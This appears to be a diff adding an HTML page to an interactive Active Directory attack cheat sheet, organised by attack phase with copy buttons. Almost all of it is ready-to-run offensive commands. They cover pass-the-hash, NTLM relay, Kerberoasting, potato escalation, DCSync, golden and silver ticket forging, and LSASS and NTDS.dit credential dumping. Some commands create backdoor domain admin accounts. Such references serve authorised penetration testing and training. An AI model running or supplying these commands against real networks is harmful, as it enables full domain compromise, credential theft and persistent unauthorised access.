+      <div class="ac-body">
+        <p class="desc">Find abusable ACLs: GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Find interesting ACLs for current user</div><div class="cb-cmd"><span class="kw">Find-InterestingDomainAcl</span> <span class="flg">-ResolveGUIDs</span> | <span class="kw">?</span>{<span class="arg">$_.IdentityReferenceName</span> <span class="flg">-match</span> <span class="arg">"currentuser"</span>}</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Get ACL for a specific object</div><div class="cb-cmd"><span class="kw">Get-DomainObjectAcl</span> <span class="flg">-Identity</span> <span class="arg">targetuser</span> <span class="flg">-ResolveGUIDs</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Check who has GenericAll on Domain Admins</div><div class="cb-cmd"><span class="kw">Get-DomainObjectAcl</span> <span class="flg">-Identity</span> <span class="arg">"Domain Admins"</span> <span class="flg">-ResolveGUIDs</span> | <span class="kw">?</span>{<span class="arg">$_.ActiveDirectoryRights</span> <span class="flg">-match</span> <span class="arg">"GenericAll"</span>}</div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">CrackMapExec — Bulk Enumeration</div>
+
+    <div class="ac" data-search="crackmapexec cme password spray users shares sam">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-enum">CME</span><span class="ac-title">CrackMapExec — Everything</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Check creds across subnet</div><div class="cb-cmd">crackmapexec smb <span class="arg">192.168.1.0/24</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">Password123!</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump logged in users</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">Pass</span> <span class="flg">--loggedon-users</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump SAM database</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Administrator</span> <span class="flg">-p</span> <span class="arg">Pass</span> <span class="flg">--sam</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Enum domain users via LDAP</div><div class="cb-cmd">crackmapexec ldap <span class="arg">DC_IP</span> <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">Pass</span> <span class="flg">--users</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Execute command on target</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Admin</span> <span class="flg">-p</span> <span class="arg">Pass</span> <span class="flg">-x</span> <span class="arg">"whoami"</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ LATERAL MOVEMENT ═════════════════════ -->
+  <div class="tab-page" id="tab-lateral">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-lateral"></div>
+
+    <div class="phase-lbl">Pass-the-Hash (PtH)</div>
+
+    <div class="ac" data-search="pass the hash pth ntlm lateral movement crackmapexec psexec">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-lateral">PTH</span><span class="ac-title">Pass-the-Hash — NTLM Auth</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Use captured NTLM hash to authenticate without knowing the plaintext password.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># psexec PtH</div><div class="cb-cmd">psexec.py <span class="flg">-hashes</span> <span class="arg">aad3b435b51404eeaad3b435b51404ee:NTLM_HASH</span> <span class="arg">domain/Administrator@TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># evil-winrm PtH</div><div class="cb-cmd">evil-winrm <span class="flg">-i</span> <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Administrator</span> <span class="flg">-H</span> <span class="arg">NTLM_HASH</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># CME PtH spray across subnet</div><div class="cb-cmd">crackmapexec smb <span class="arg">192.168.1.0/24</span> <span class="flg">-u</span> <span class="arg">Administrator</span> <span class="flg">-H</span> <span class="arg">NTLM_HASH</span> <span class="flg">--local-auth</span></div><span class="cb-hint">copy</span></div>
+        <div class="cn-note">Format for Impacket: LMHash:NTHash — use aad3b435... as LM placeholder if LM is empty</div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Pass-the-Ticket (PtT) / Kerberos</div>
+
+    <div class="ac" data-search="pass the ticket kerberos rubeus ticket tgt tgs">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-lateral">PTT</span><span class="ac-title">Pass-the-Ticket — Rubeus</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># List current tickets</div><div class="cb-cmd">.\Rubeus.exe triage</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump TGT from memory</div><div class="cb-cmd">.\Rubeus.exe dump <span class="flg">/service:</span><span class="arg">krbtgt</span> <span class="flg">/nowrap</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Import ticket (Rubeus)</div><div class="cb-cmd">.\Rubeus.exe ptt <span class="flg">/ticket:</span><span class="arg">BASE64_TICKET</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Import ticket (Mimikatz)</div><div class="cb-cmd"><span class="kw">kerberos::ptt</span> <span class="arg">ticket.kirbi</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Impacket PtT (Linux)</div><div class="cb-cmd">export KRB5CCNAME=<span class="arg">ticket.ccache</span>
+psexec.py <span class="flg">-k -no-pass</span> <span class="arg">domain.local/user@TARGET</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">NTLM Relay Attack</div>
+
+    <div class="ac" data-search="ntlm relay responder ntlmrelayx smb signing">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-lateral">RELAY</span><span class="ac-title">NTLM Relay — ntlmrelayx</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">When SMB signing is disabled, relay captured NTLM auth to another host without cracking.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Find hosts without SMB signing</div><div class="cb-cmd">crackmapexec smb <span class="arg">192.168.1.0/24</span> <span class="flg">--gen-relay-list</span> <span class="arg">relay_targets.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Disable SMB/HTTP in Responder.conf, then run both</div><div class="cb-cmd">responder <span class="flg">-I</span> <span class="arg">eth0</span> <span class="flg">-dwP</span>
+ntlmrelayx.py <span class="flg">-tf</span> <span class="arg">relay_targets.txt</span> <span class="flg">-smb2support</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Relay to get interactive shell</div><div class="cb-cmd">ntlmrelayx.py <span class="flg">-tf</span> <span class="arg">relay_targets.txt</span> <span class="flg">-smb2support -i</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Relay and execute command</div><div class="cb-cmd">ntlmrelayx.py <span class="flg">-tf</span> <span class="arg">relay_targets.txt</span> <span class="flg">-smb2support -c</span> <span class="arg">"net user hacker P@ss123! /add && net localgroup administrators hacker /add"</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Token Impersonation</div>
+
+    <div class="ac" data-search="token impersonation incognito meterpreter">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-lateral">TOKEN</span><span class="ac-title">Token Impersonation — Incognito</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Meterpreter token impersonation</div><div class="cb-cmd">load incognito
+list_tokens <span class="flg">-u</span>
+impersonate_token <span class="arg">"DOMAIN\\Administrator"</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># PowerShell token steal (SeImpersonatePrivilege)</div><div class="cb-cmd"><span class="kw">Invoke-TokenManipulation</span> <span class="flg">-ImpersonateUser</span> <span class="flg">-Username</span> <span class="arg">"domain\admin"</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ PRIVILEGE ESCALATION ═════════════════ -->
+  <div class="tab-page" id="tab-priv">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-priv"></div>
+
+    <div class="phase-lbl">Kerberoasting</div>
+
+    <div class="ac" data-search="kerberoasting SPN TGS ticket service account crack">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">KERB</span><span class="ac-title">Kerberoasting — Service Account Hashes</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Request TGS tickets for SPN accounts. The ticket is encrypted with the service account's NTLM hash — crack offline.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GetUserSPNs (Impacket)</div><div class="cb-cmd">GetUserSPNs.py <span class="arg">domain.local/user:Password</span> <span class="flg">-dc-ip</span> <span class="arg">DC_IP</span> <span class="flg">-request</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Rubeus Kerberoast</div><div class="cb-cmd">.\Rubeus.exe kerberoast <span class="flg">/nowrap</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># PowerView</div><div class="cb-cmd"><span class="kw">Invoke-Kerberoast</span> <span class="flg">-OutputFormat</span> <span class="arg">Hashcat</span> | <span class="kw">Select-Object</span> <span class="arg">Hash</span> | <span class="kw">Out-File</span> <span class="arg">hashes.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Crack TGS hash (mode 13100)</div><div class="cb-cmd">hashcat <span class="flg">-m</span> <span class="arg">13100</span> <span class="arg">hashes.txt</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">AS-REP Roasting</div>
+
+    <div class="ac" data-search="asrep roasting preauth not required npusers hash crack">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">AS-REP</span><span class="ac-title">AS-REP Roasting — No Preauth Accounts</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Users with "Do not require Kerberos preauthentication" send AS-REP without auth — grab &amp; crack.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GetNPUsers (Impacket) — with creds</div><div class="cb-cmd">GetNPUsers.py <span class="arg">domain.local/user:Password</span> <span class="flg">-dc-ip</span> <span class="arg">DC_IP</span> <span class="flg">-request</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GetNPUsers — without creds (username list)</div><div class="cb-cmd">GetNPUsers.py <span class="arg">domain.local/</span> <span class="flg">-dc-ip</span> <span class="arg">DC_IP</span> <span class="flg">-usersfile</span> <span class="arg">users.txt</span> <span class="flg">-format</span> <span class="arg">hashcat</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Rubeus AS-REP roast</div><div class="cb-cmd">.\Rubeus.exe asreproast <span class="flg">/nowrap</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Crack (mode 18200)</div><div class="cb-cmd">hashcat <span class="flg">-m</span> <span class="arg">18200</span> <span class="arg">hashes.txt</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="badge-row"><span class="badge b-hash">-m 5600 = NTLMv2</span><span class="badge b-hash">-m 13100 = Kerberoast</span><span class="badge b-hash">-m 18200 = AS-REP</span><span class="badge b-hash">-m 1000 = NTLM</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">ACL Abuse</div>
+
+    <div class="ac" data-search="acl genericall genericwrite forcechangepassword ownership dcsync writedacl">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">ACL</span><span class="ac-title">ACL Abuse — GenericAll / GenericWrite / WriteDACL</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GenericAll on user → force password reset</div><div class="cb-cmd"><span class="kw">Set-DomainUserPassword</span> <span class="flg">-Identity</span> <span class="arg">targetuser</span> <span class="flg">-AccountPassword</span> (<span class="kw">ConvertTo-SecureString</span> <span class="arg">'NewPass123!'</span> <span class="flg">-AsPlainText -Force</span>)</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GenericAll on group → add yourself</div><div class="cb-cmd"><span class="kw">Add-DomainGroupMember</span> <span class="flg">-Identity</span> <span class="arg">'Domain Admins'</span> <span class="flg">-Members</span> <span class="arg">'youruser'</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># WriteDACL → grant yourself DCSync rights</div><div class="cb-cmd"><span class="kw">Add-DomainObjectAcl</span> <span class="flg">-TargetIdentity</span> <span class="arg">"DC=domain,DC=local"</span> <span class="flg">-PrincipalIdentity</span> <span class="arg">youruser</span> <span class="flg">-Rights</span> <span class="arg">DCSync</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GenericWrite on user → set SPN (then Kerberoast)</div><div class="cb-cmd"><span class="kw">Set-DomainObject</span> <span class="flg">-Identity</span> <span class="arg">targetuser</span> <span class="flg">-Set</span> @{<span class="arg">serviceprincipalname</span>=<span class="arg">'fake/fake'</span>}</div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">SeImpersonate / Potato Attacks</div>
+
+    <div class="ac" data-search="potato seimpersonate privilege escalation printspoofer juicypotato godpotato">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">POTATO</span><span class="ac-title">Potato Attacks — SeImpersonatePrivilege</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">If you have SeImpersonatePrivilege (common on service accounts, IIS, SQL), escalate to SYSTEM.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Check privileges first</div><div class="cb-cmd">whoami /priv</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># PrintSpoofer (Server 2019 / Win10)</div><div class="cb-cmd">.\PrintSpoofer.exe <span class="flg">-i -c</span> <span class="arg">cmd</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GodPotato (universal)</div><div class="cb-cmd">.\GodPotato.exe <span class="flg">-cmd</span> <span class="arg">"cmd /c whoami"</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># JuicyPotato (older systems)</div><div class="cb-cmd">.\JuicyPotato.exe <span class="flg">-l</span> <span class="arg">1337</span> <span class="flg">-p</span> <span class="arg">cmd.exe</span> <span class="flg">-a</span> <span class="arg">"/c net user hacker P@ss /add"</span> <span class="flg">-t</span> <span class="arg">*</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ DOMAIN COMPROMISE ════════════════════ -->
+  <div class="tab-page" id="tab-da">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-da"></div>
+
+    <div class="phase-lbl">DCSync — Domain Hash Dump</div>
+
+    <div class="ac" data-search="dcsync secretsdump mimikatz ntds all hashes dc replication">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">DCSYNC</span><span class="ac-title">DCSync — Dump All Domain Hashes</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Simulate DC replication to pull all password hashes from AD. Requires DA or DCSync ACL rights (GetChanges + GetChangesAll).</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># secretsdump (Impacket) — remote</div><div class="cb-cmd">secretsdump.py <span class="arg">domain.local/Administrator:Password@DC_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># secretsdump with hash (PtH)</div><div class="cb-cmd">secretsdump.py <span class="flg">-hashes</span> <span class="arg">:NTLM_HASH</span> <span class="arg">domain/Administrator@DC_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Mimikatz DCSync (on target)</div><div class="cb-cmd"><span class="kw">lsadump::dcsync</span> <span class="flg">/domain:</span><span class="arg">domain.local</span> <span class="flg">/user:</span><span class="arg">krbtgt</span>
+<span class="kw">lsadump::dcsync</span> <span class="flg">/all /csv</span></div><span class="cb-hint">copy</span></div>
+        <div class="cn-note">Grab: Administrator, krbtgt, and all DA accounts. krbtgt hash enables Golden Ticket attacks.</div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Golden Ticket Attack</div>
+
+    <div class="ac" data-search="golden ticket krbtgt mimikatz rubeus forged TGT persistence">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-persist">GOLDEN</span><span class="ac-title">Golden Ticket — Forge TGT with krbtgt Hash</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">With the krbtgt hash, forge a TGT for any user — valid for 10 years. Full domain persistence.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Get domain SID</div><div class="cb-cmd"><span class="kw">Get-DomainSID</span>  <span class="flg"># PowerView</span>
+whoami /user    <span class="flg"># or parse SID from here</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Mimikatz Golden Ticket</div><div class="cb-cmd"><span class="kw">kerberos::golden</span> <span class="flg">/user:</span><span class="arg">Administrator</span> <span class="flg">/domain:</span><span class="arg">domain.local</span> <span class="flg">/sid:</span><span class="arg">S-1-5-21-...</span> <span class="flg">/krbtgt:</span><span class="arg">KRBTGT_HASH</span> <span class="flg">/ticket:</span><span class="arg">golden.kirbi</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Use the ticket</div><div class="cb-cmd"><span class="kw">kerberos::ptt</span> <span class="arg">golden.kirbi</span>
+dir <span class="arg">\\DC\C$</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Rubeus Golden Ticket</div><div class="cb-cmd">.\Rubeus.exe golden <span class="flg">/rc4:</span><span class="arg">KRBTGT_HASH</span> <span class="flg">/domain:</span><span class="arg">domain.local</span> <span class="flg">/sid:</span><span class="arg">S-1-5-21-...</span> <span class="flg">/user:</span><span class="arg">Administrator</span> <span class="flg">/ptt</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Silver Ticket Attack</div>
+
+    <div class="ac" data-search="silver ticket service hash forged TGS stealthy">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-persist">SILVER</span><span class="ac-title">Silver Ticket — Forge TGS for Specific Service</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">With a service account NTLM hash, forge a TGS for that service. More stealthy than Golden Ticket — no DC contact needed.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Mimikatz Silver Ticket (e.g., CIFS/SMB)</div><div class="cb-cmd"><span class="kw">kerberos::golden</span> <span class="flg">/user:</span><span class="arg">Administrator</span> <span class="flg">/domain:</span><span class="arg">domain.local</span> <span class="flg">/sid:</span><span class="arg">DOMAIN_SID</span> <span class="flg">/rc4:</span><span class="arg">SERVICE_NTLM_HASH</span> <span class="flg">/target:</span><span class="arg">server.domain.local</span> <span class="flg">/service:</span><span class="arg">cifs</span> <span class="flg">/ptt</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Domain Persistence</div>
+
+    <div class="ac" data-search="skeleton key persistence dcshadow adminSDHolder backdoor">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-persist">PERSIST</span><span class="ac-title">Domain Persistence Techniques</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Skeleton Key (in-memory patch — any user = "mimikatz" password)</div><div class="cb-cmd">misc::skeleton</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># AdminSDHolder abuse — persist ACL on protected groups</div><div class="cb-cmd"><span class="kw">Add-DomainObjectAcl</span> <span class="flg">-TargetIdentity</span> <span class="arg">"CN=AdminSDHolder,CN=System,DC=domain,DC=local"</span> <span class="flg">-PrincipalIdentity</span> <span class="arg">youruser</span> <span class="flg">-Rights</span> <span class="arg">All</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Add user to Domain Admins</div><div class="cb-cmd">net group <span class="arg">"Domain Admins"</span> <span class="arg">youruser</span> <span class="flg">/add /domain</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Create backdoor admin</div><div class="cb-cmd">net user <span class="arg">backdoor</span> <span class="arg">P@ssw0rd!</span> <span class="flg">/add /domain</span>
+net group <span class="arg">"Domain Admins"</span> <span class="arg">backdoor</span> <span class="flg">/add /domain</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">NTDS.dit Extraction</div>
+
+    <div class="ac" data-search="ntds dit extraction shadow copy ntdsutil vss offline">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-priv">NTDS</span><span class="ac-title">NTDS.dit Offline Extraction</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">If you have DA access to the DC, extract NTDS.dit directly for offline hash extraction.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># ntdsutil method</div><div class="cb-cmd">ntdsutil <span class="arg">"activate instance ntds"</span> <span class="arg">"ifm"</span> <span class="arg">"create full C:\temp\ntds"</span> <span class="arg">quit</span> <span class="arg">quit</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># VSS shadow copy method</div><div class="cb-cmd">vssadmin create shadow <span class="flg">/for=</span><span class="arg">C:</span>
+copy <span class="arg">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit</span> <span class="arg">C:\temp</span>
+copy <span class="arg">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span> <span class="arg">C:\temp</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Extract hashes offline with secretsdump</div><div class="cb-cmd">secretsdump.py <span class="flg">-ntds</span> <span class="arg">ntds.dit</span> <span class="flg">-system</span> <span class="arg">SYSTEM</span> <span class="arg">LOCAL</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ CREDENTIALS ══════════════════════════ -->
+  <div class="tab-page" id="tab-creds">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-creds"></div>
+
+    <div class="phase-lbl">Local Credential Dumping</div>
+
+    <div class="ac" data-search="mimikatz lsass sekurlsa credentials dump memory">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-cred">MIMIKATZ</span><span class="ac-title">Mimikatz — LSASS Dump</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump plaintext creds from memory</div><div class="cb-cmd">privilege::debug
+sekurlsa::logonpasswords</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump NTLM hashes only</div><div class="cb-cmd">sekurlsa::msv</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump Kerberos tickets</div><div class="cb-cmd">sekurlsa::tickets</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Dump SAM database</div><div class="cb-cmd">lsadump::sam</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Remote mimikatz via CME</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Admin</span> <span class="flg">-p</span> <span class="arg">Pass</span> <span class="flg">-M</span> <span class="arg">mimikatz</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="lsass dump procdump minidump taskmgr offline pypykatz">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-cred">LSASS</span><span class="ac-title">LSASS Memory Dump — Offline Analysis</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># ProcDump (Sysinternals)</div><div class="cb-cmd">procdump.exe <span class="flg">-accepteula -ma</span> <span class="arg">lsass.exe</span> <span class="arg">lsass.dmp</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># comsvcs.dll method (no extra tools)</div><div class="cb-cmd">rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <span class="arg">LSASS_PID</span> <span class="arg">C:\temp\lsass.dmp</span> full</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Parse dump offline with pypykatz</div><div class="cb-cmd">pypykatz lsa minidump <span class="arg">lsass.dmp</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Or with mimikatz offline</div><div class="cb-cmd">sekurlsa::minidump <span class="arg">lsass.dmp</span>
+sekurlsa::logonpasswords</div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Credential Hunting</div>
+
+    <div class="ac" data-search="password hunting files configs grep scripts plaintext registry">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-cred">HUNT</span><span class="ac-title">Credential Hunting — Files &amp; Registry</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Search for password strings in files</div><div class="cb-cmd">findstr <span class="flg">/si</span> <span class="arg">password</span> <span class="arg">*.txt *.xml *.ini *.config *.ps1 *.bat</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Windows autologin creds in registry</div><div class="cb-cmd">reg query <span class="arg">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># GPP (Group Policy Preferences) cpassword</div><div class="cb-cmd">findstr <span class="flg">/S /I</span> <span class="arg">cpassword</span> <span class="arg">\\DC\SYSVOL\*.xml</span>
+gpp-decrypt <span class="arg">ENCRYPTED_CPASSWORD</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># PowerShell command history</div><div class="cb-cmd">type <span class="arg">C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Check Windows Credential Manager</div><div class="cb-cmd">cmdkey <span class="flg">/list</span>
+.\mimikatz.exe <span class="arg">"vault::list"</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Hash Cracking Reference</div>
+
+    <div class="ac" data-search="hashcat john cracking modes wordlist rule">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-cred">CRACK</span><span class="ac-title">Hashcat — Mode Reference &amp; Rules</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="badge-row">
+          <span class="badge b-hash">1000 = NTLM</span>
+          <span class="badge b-hash">5600 = NTLMv2</span>
+          <span class="badge b-hash">13100 = Kerberoast</span>
+          <span class="badge b-hash">18200 = AS-REP</span>
+          <span class="badge b-hash">7500 = KRB5 TGS</span>
+        </div>
